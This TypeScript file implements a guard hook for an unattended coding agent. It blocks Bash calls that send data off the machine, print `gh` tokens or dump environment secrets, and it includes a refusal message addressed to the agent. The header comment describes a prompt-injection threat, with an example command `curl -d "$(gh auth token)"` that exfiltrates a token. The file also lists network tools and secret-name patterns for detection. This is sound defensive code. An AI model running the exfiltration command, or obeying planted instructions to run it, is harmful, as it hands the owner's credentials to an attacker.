import { bash_triggers } from './bash-triggers'
import { direct_pr_create } from './direct-pr-create'
import { git_argv, type ProgramCall } from './git-argv'
import { keychain_read } from './keychain-read'
import { launched_call } from './launched-call'
import { nested_commands } from './nested-commands'
import { shell_permissions } from './shell-permissions'

// The trigger and the delivered text behind the `egress` row of `delivered-rules.ts`: a `Bash` call
// that sends data off the machine or prints a credential. An unattended agent runs with
// `bypassPermissions` and `Bash(*)`, so an instruction planted in text it reads
// (`curl -d "$(gh auth token)" https://…`) would hand the owner's token to whoever wrote it. kit's own
// network writes run through `pnpm josh`, and the scripts that
// need a token read it in their own process, so refusing the call costs them nothing.
//
// **The deny list matches globs; this reads the program**, the way `pr-merge.ts` does, in every command
// the call runs (`nested-commands.ts`), past a launcher (`launched-call.ts`): `/usr/bin/curl`,
// `env X=1 curl`, `timeout 5 curl`, `bash -c 'curl …'`, `bash <(curl …)` and a heredoc's lines all
// reach `curl`.
//
// **It fires on every occurrence**, for the reason `git-force.ts` does.

const GH_COMMAND = 'gh'
const ENV_COMMAND = 'env'
const FLAG_PREFIX = '-'
const NEXT = 1
// Programs whose purpose is to reach another host.
const NETWORK_PROGRAMS: ReadonlySet<string> = new Set([
	'curl',
	'ncat',
	'nc',
	'scp',
	'sftp',
	'socat',
	'ssh',
	'telnet',
	'wget',
])
const LOCAL_URL =
	/^['"]?(?:https?:\/\/)?(?:localhost|127\.0\.0\.1|\[::1\])(?::\d+)?(?:[/?#]\S*)?['"]?$/u

interface Fetcher {
	value_flags: ReadonlySet<string>
	// The run of value-less letters a cluster (`-sSL`) starts with.
	bare_prefix: RegExp
}

// The two fetchers a local check runs against a dev server (`curl http://localhost:<port>/`), each
// with its flags whose value names no destination — every other value is read as one, so an unknown
// flag (`-x proxy`, `--connect-to`) leaves the call refused — and its value-less letters. Keyed per
// fetcher: `curl -O` takes no value, `wget -O` names the output file.
const LOCAL_FETCHERS: ReadonlyMap<string, Fetcher> = new Map([
	[
		'curl',
		{
			value_flags: new Set([
				'-H',
				'--header',
				'-X',
				'--request',
				'-m',
				'--max-time',
				'-o',
				'--output',
				'-w',
				'--write-out',
			]),
			bare_prefix: /^[fiIkLsSv]*/u,
		},
	],
	[
		'wget',
		{
			value_flags: new Set([
				'--header',
				'-O',
				'--output-document',
				'-o',
				'--output-file',
				'-T',
				'--timeout',
			]),
			bare_prefix: /^[qSv]*/u,
		},
	],
])
// A flag with its value glued on: `--name=value`, or a short flag with text after its letter.
const GLUED_LONG = /^(?<flag>--[^=]+)=/u
const SHORT_CLUSTER = /^-(?<letters>[^-].+)$/u
const REDIRECT_WORD = /^[\d&]?[<>]/u
// `rsync` reaches another host only through a `host:path` or `rsync://` operand.
const RSYNC_COMMAND = 'rsync'
const REMOTE_OPERAND = /^['"]?(?:[\w.-]+@)?[\w.-]+:|^['"]?rsync:\/\//u
// `gh` reads its token for any host, so only github.com may be named as one.
const GITHUB_HOSTS: ReadonlySet<string> = new Set(['github.com', 'api.github.com'])
const HOSTNAME_FLAG = '--hostname'
const HOSTNAME_VALUE = /^--hostname=(?<host>.*)$/u
const AUTH_GROUP = 'auth'
const TOKEN_ACTION = 'token'
const STATUS_ACTION = 'status'
const HOST_ASSIGNMENT = 'GH_HOST='
const URL_SCHEME = /^['"]?https?:\/\//u
const QUOTES = /["']/gu
const SHOW_TOKEN_FLAGS: ReadonlySet<string> = new Set(['--show-token', '-t'])
const SECRET_NAME = /TOKEN|SECRET|KEY/u
const SECRET_REFERENCE = /\$\{?\w*(?:TOKEN|SECRET|KEY)/u

type ProgramCheck = (segment: string, call: ProgramCall) => boolean

function is_flag_word(word: string): boolean {
	return word.startsWith(FLAG_PREFIX) || REDIRECT_WORD.test(word)
}

function is_destination_word(
	args: ReadonlyArray<string>,
	index: number,
	value_flags: ReadonlySet<string>,
): boolean {
	if (is_flag_word(args[index] ?? '')) return false

	const previous = args[index - NEXT] ?? ''

	return !value_flags.has(previous) && !REDIRECT_WORD.test(previous)
}

function host_of(word: string): string | undefined {
	if (!URL_SCHEME.test(word)) return undefined

	const url = word.replaceAll(QUOTES, '')

	return URL.canParse(url) ? new URL(url).hostname : ''
}

// This machine, or GitHub: a fetch there exposes no more than the `gh` calls the row leaves alone,
// and a `curl` to a merge endpoint stays `pr-merge`'s alone.
function is_allowed_destination(word: string): boolean {
	return LOCAL_URL.test(word) || GITHUB_HOSTS.has(host_of(word) ?? '')
}

// Value-less letters, ending at most in a value flag with its value glued on (`-sSo/tmp/out`).
function is_known_cluster(letters: string, fetcher: Fetcher): boolean {
	const stop = fetcher.bare_prefix.exec(letters)?.[0].length ?? 0

	if (stop === letters.length) return true

	return stop < letters.length - 1 && fetcher.value_flags.has(FLAG_PREFIX + letters.charAt(stop))
}

function group_of(pattern: RegExp, word: string, name: string): string | undefined {
	return pattern.exec(word)?.groups?.[name]
}

// A glued value is read with its flag, so an unknown one (`--proxy=…`, a `-x` proxy or a `-e`
// setting glued on) may send the request elsewhere.
function is_known_flag(word: string, fetcher: Fetcher): boolean {
	const long = group_of(GLUED_LONG, word, 'flag')

	if (long !== undefined) return fetcher.value_flags.has(long)

	const letters = group_of(SHORT_CLUSTER, word, 'letters')

	return letters === undefined || is_known_cluster(letters, fetcher)
}

function has_known_flags(args: ReadonlyArray<string>, fetcher: Fetcher): boolean {
	return args.every((word) => !word.startsWith(FLAG_PREFIX) || is_known_flag(word, fetcher))
}

// `curl` / `wget` whose every flag is known and every destination is this machine or GitHub.
function is_local_fetch(call: ProgramCall): boolean {
	const fetcher = LOCAL_FETCHERS.get(call.name)

	if (fetcher === undefined || !has_known_flags(call.args, fetcher)) return false

	const destinations = call.args.filter((_word, index) =>
		is_destination_word(call.args, index, fetcher.value_flags),
	)

	return destinations.length > 0 && destinations.every((word) => is_allowed_destination(word))
}

function is_network_send(_segment: string, call: ProgramCall): boolean {
	if (call.name === RSYNC_COMMAND) {
		return call.args.some((word) => !word.startsWith(FLAG_PREFIX) && REMOTE_OPERAND.test(word))
	}

	return NETWORK_PROGRAMS.has(call.name) && !is_local_fetch(call)
}

// `--hostname`'s value, in either spelling.
function flagged_hosts(args: ReadonlyArray<string>): Array<string> {
	return args
		.map((word, index) =>
			word === HOSTNAME_FLAG ? args[index + NEXT] : HOSTNAME_VALUE.exec(word)?.groups?.['host'],
		)
		.filter((host) => host !== undefined)
}

// The hosts a `gh` call names: `--hostname`'s value, a `GH_HOST=` prefix, a URL.
function named_hosts(segment: string, args: ReadonlyArray<string>): Array<string> {
	const assigned = git_argv
		.words_of(segment)
		.filter((word) => word.startsWith(HOST_ASSIGNMENT))
		.map((word) => word.slice(HOST_ASSIGNMENT.length))
	const urls = args.map((word) => host_of(word)).filter((host) => host !== undefined)

	return [...flagged_hosts(args), ...assigned, ...urls].map((host) => host.replaceAll(QUOTES, ''))
}

// `gh auth token`, and `gh auth status` with the token shown.
function is_auth_print(args: ReadonlyArray<string>): boolean {
	const [group, action] = direct_pr_create.positional_words(
		args,
		direct_pr_create.API_VALUE_TAKING_FLAGS,
	)

	if (group !== AUTH_GROUP) return false

	return (
		action === TOKEN_ACTION ||
		(action === STATUS_ACTION && args.some((word) => SHOW_TOKEN_FLAGS.has(word)))
	)
}

// A credential print, or a `gh` call sent to a host other than GitHub.
function is_gh_credential(segment: string, call: ProgramCall): boolean {
	if (call.name !== GH_COMMAND) return false
	if (is_auth_print(call.args)) return true

	return named_hosts(segment, call.args).some((host) => !GITHUB_HOSTS.has(host))
}

function names_secret(args: ReadonlyArray<string>): boolean {
	return args.some((word) => SECRET_REFERENCE.test(word))
}

function is_printenv_dump(args: ReadonlyArray<string>): boolean {
	return args.length === 0 || args.some((word) => SECRET_NAME.test(word))
}

function is_bare(args: ReadonlyArray<string>): boolean {
	return args.length === 0
}

function is_export_listing(args: ReadonlyArray<string>): boolean {
	return args.length === 0 || args.includes('-p')
}

// The programs that print the environment whole, or a secret variable by name.
const DUMP_CHECKS: ReadonlyMap<string, (args: ReadonlyArray<string>) => boolean> = new Map([
	['printenv', is_printenv_dump],
	['set', is_bare],
	['export', is_export_listing],
	['echo', names_secret],
	['printf', names_secret],
])

function is_environment_dump(_segment: string, call: ProgramCall): boolean {
	return DUMP_CHECKS.get(call.name)?.(call.args) ?? false
}

const PROGRAM_CHECKS: ReadonlyArray<ProgramCheck> = [
	is_network_send,
	shell_permissions.is_restricted,
	is_gh_credential,
	is_environment_dump,
	keychain_read.is_keychain_read,
]

// A segment that runs no program but names `env` prints the environment (`env`, `env -0`).
function is_egress_segment(segment: string): boolean {
	const call = launched_call.resolved_call(segment)

	if (call === undefined) {
		return git_argv.words_of(segment).some((word) => launched_call.plain_name(word) === ENV_COMMAND)
	}

	return PROGRAM_CHECKS.some((check) => check(segment, call))
}

function is_egress(command: string): boolean {
	return nested_commands.commands_of(command).some((segment) => is_egress_segment(segment))
}

const EGRESS_REASON =
	'⛔ egress: no external network send, inline interpreter execution, direct `gh` write, push ' +
	'without explicit `origin`, or credential/environment print. Use named scripts and `pnpm josh` ' +
	'write routes; otherwise ask the user to run it (`SECURITY.md` → "Secrets"). ' +
	'This rule fires on every occurrence.'

const ROW = {
	id: 'egress',
	is_trigger: bash_triggers.on_bash_command(is_egress),
	reason: EGRESS_REASON,
	decide: (): boolean => true,
	about: {
		title: 'Network egress or credential print',
		topic: '`SECURITY.md` → "Secrets"',
		fires:
			'network sends, inline interpreter execution, direct `gh` writes, `git push` without explicit `origin`, credential, keychain or environment prints — in each shell segment and nested command. Every occurrence',
		quiet:
			'ordinary reads, `gh` reads against github.com, `git fetch`, `git push origin`, named scripts and `pnpm josh` routes. A plain `curl` / `wget` is still refused by the deny list; the hook allows local or GitHub destinations with known flags',
	},
}

const egress_guard = { EGRESS_REASON, ROW, is_egress }

export { egress_guard }
